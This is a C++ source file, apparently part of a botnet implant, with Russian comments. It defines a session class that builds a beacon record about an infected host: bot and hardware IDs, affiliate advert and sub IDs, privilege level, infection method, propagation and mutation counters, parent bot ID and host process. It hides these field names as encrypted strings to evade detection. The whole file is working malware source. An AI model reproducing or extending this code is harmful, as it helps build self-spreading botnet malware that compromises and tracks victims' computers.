#include "BotSession.hpp"
#include "utils.hpp"
#include "configreader.h"
#include "json_builder.hpp"
#include "strings.hpp"

DefaultSession::DefaultSession()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultSession] constructor");
#endif
	this->pwSessionUID = nullptr;
	this->pwHostProcess = nullptr;
	this->pwSessionJson = nullptr;
	this->bMsystemInitialized = FALSE;
}

DefaultSession::~DefaultSession()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultSession] destructor");
#endif
	if (this->pwSessionUID != nullptr)
		delete[]this->pwSessionUID;
	if (this->pwHostProcess != nullptr)
		delete[]this->pwHostProcess;
	if (this->pwSessionJson != nullptr)
	{
		RtlSecureZeroMemory(this->pwSessionJson, wcslen(this->pwSessionJson));
		delete[]this->pwSessionJson;
		this->pwSessionJson = nullptr;
	}
}

BOOL DefaultSession::init(LPBYTE lpAdditional)
{
	session_param *param = (session_param*)lpAdditional;

	// инициализируем алфавит из которого будет происходить генерация
	WCHAR wchAlphabet[('Z' - 'A' + 1)];
	for (UINT i = 0; i < sizeof(wchAlphabet) / sizeof(WCHAR); i++)
		wchAlphabet[i] = 'A' + i;

	if (this->pwSessionUID != nullptr)
	{
		delete[]this->pwSessionUID;
		this->pwSessionUID = nullptr;
	}

	if (this->pwHostProcess != nullptr)
	{
		delete[]this->pwHostProcess;
		this->pwHostProcess = nullptr;
	}

	if (param != nullptr)
	{
		session_param *param = (session_param*)lpAdditional;
		this->bMsystemInitialized = param->bModulesystemInitiailized;
	}

	this->dwAdvertID = config_data::cfg->dwAdvertID;
	this->dwSubID = config_data::cfg->dwSubID;

	BOOL bRet = FALSE;

	WCHAR wchHostProcessNotEscaped[MAX_PATH + 1];
	RtlSecureZeroMemory(wchHostProcessNotEscaped, sizeof(wchHostProcessNotEscaped));

	UINT uSessionSize = BOT_SESSION_UID_LENGTH + wcslen(global_data::pwBotID) + 1;
	this->pwHostProcess = new WCHAR[MAX_PATH * 2 + 2];
	this->pwSessionUID = new WCHAR[uSessionSize + 1 + 1]; // вместе с нулевым символом и еще в запасе
	do
	{
		if ((this->pwHostProcess == nullptr) || (this->pwSessionUID == nullptr))
			break;
		
		GetModuleFileNameW(NULL, wchHostProcessNotEscaped, MAX_PATH);
		UINT j = 0;
		for (UINT i = 0; i < wcslen(wchHostProcessNotEscaped); i++)
		{
			this->pwHostProcess[j++] = wchHostProcessNotEscaped[i];
			if (wchHostProcessNotEscaped[i] == L'\\')
				this->pwHostProcess[j++] = L'\\';
		}

		RtlSecureZeroMemory(this->pwSessionUID, uSessionSize * sizeof(WCHAR));

		long holdrand = GetTickCount();
		UINT uLength = 32;
		for (UINT i = 0; i < BOT_SESSION_UID_LENGTH; i++)
			this->pwSessionUID[i] = wchAlphabet[(_rand(&holdrand) % (sizeof(wchAlphabet) / sizeof(WCHAR)))];
		wcscat(this->pwSessionUID, global_data::pwBotID);

		bRet = TRUE;
	} while (FALSE);

	return bRet;
}

PWCHAR DefaultSession::get_uid()
{
	return this->pwSessionUID;
}

PWCHAR DefaultSession::get_hostprocess()
{
	return this->pwHostProcess;
}

DWORD DefaultSession::get_hostarch()
{
#ifdef _WIN64
	return 64;
#else
	return 86;
#endif
}

DWORD DefaultSession::get_advertid()
{
	return this->dwAdvertID;
}

DWORD DefaultSession::get_subid()
{
	return this->dwSubID;
}

PWCHAR DefaultSession::get_json_session()
{
	if (this->pwSessionJson == nullptr)
	{
		CCryptString cStr_MainID(cryptedstr_MainID);
		CCryptString cStr_SubID(cryptedstr_SubsidiaryID);
		CCryptString cStr_SessionIdentifier(cryptedstr_SessionIdentifier);
		CCryptString cStr_HostProcessName(cryptedstr_HostProcessName);
		CCryptString cStr_HostProcessArch(cryptedstr_HostProcessArch);
		CCryptString cStr_msys(cryptedstr_msys);
		CCryptString cStr_bid(cryptedstr_bid);
		CCryptString cStr_hid(cryptedstr_hid);
		CCryptString cStr_parentbid(cryptedstr_parentbid);
		CCryptString cStr_dna(cryptedstr_dna);
		CCryptString cStr_infway(cryptedstr_infway);
		CCryptString cStr_nmutations(cryptedstr_nmutations);
		CCryptString cStr_gen(cryptedstr_gen);
		CCryptString cStr_noparent(cryptedstr_noparent);
		CCryptString cStr_il(cryptedstr_il);

		CCryptString cStr_VERSION(cryptedstr_m0yv_VERSION);
		CCryptString cStr_vername(cryptedstr_m0yvver);
		CCryptString cStr_propctr(cryptedstr_propctr);

		JsonBuilder jbuild;
		if (!jbuild.init(DEFAULT_JSON_MAXLENGTH))
			return nullptr;

		jbuild.add(cStr_bid.w_str(), global_data::pwBotID);
		jbuild.add(cStr_hid.w_str(), global_data::pwHardwareID);
		jbuild.add(cStr_MainID.w_str(), this->dwAdvertID);
		jbuild.add(cStr_SubID.w_str(), this->dwSubID);
		jbuild.add(cStr_il.w_str(), global_data::dwIntegrityLevel);

		if (global_data::pExtendedDataCopy != nullptr)
		{
			jbuild.add(cStr_gen.w_str(), global_data::pExtendedDataCopy->dwGenCounter);
			jbuild.add(cStr_propctr.w_str(), global_data::pExtendedDataCopy->dwPropCounter);
			jbuild.add(cStr_vername.w_str(), cStr_VERSION.w_str()); 
			jbuild.add(cStr_nmutations.w_str(), global_data::pExtendedDataCopy->dwDNAMutatorCounter);
			jbuild.add(cStr_infway.w_str(), global_data::pExtendedDataCopy->dwWayInfected);
			if (global_data::pExtendedDataCopy->parentBotId[0] != L'\0')
				jbuild.add(cStr_parentbid.w_str(), global_data::pExtendedDataCopy->parentBotId);
			else
				jbuild.add(cStr_parentbid.w_str(), cStr_noparent.w_str());
		}

		jbuild.add(cStr_HostProcessName.w_str(), this->get_hostprocess());
		jbuild.add(cStr_HostProcessArch.w_str(), this->get_hostarch());
		jbuild.add(cStr_msys.w_str(), this->bMsystemInitialized);
		jbuild.add(cStr_SessionIdentifier.w_str(), this->get_uid());

		PWCHAR pwJson = jbuild.finish();
		if (pwJson == nullptr)
			return nullptr;

		this->pwSessionJson = new WCHAR[wcslen(pwJson) + 2];
		if (this->pwSessionJson == nullptr)
			return nullptr;

		wcscpy(this->pwSessionJson, pwJson);

#ifdef _DEBUG
		WriteLog(L"[BotSession::get_json_session] json: ", this->pwSessionJson);
#endif
	}

	return this->pwSessionJson;
}


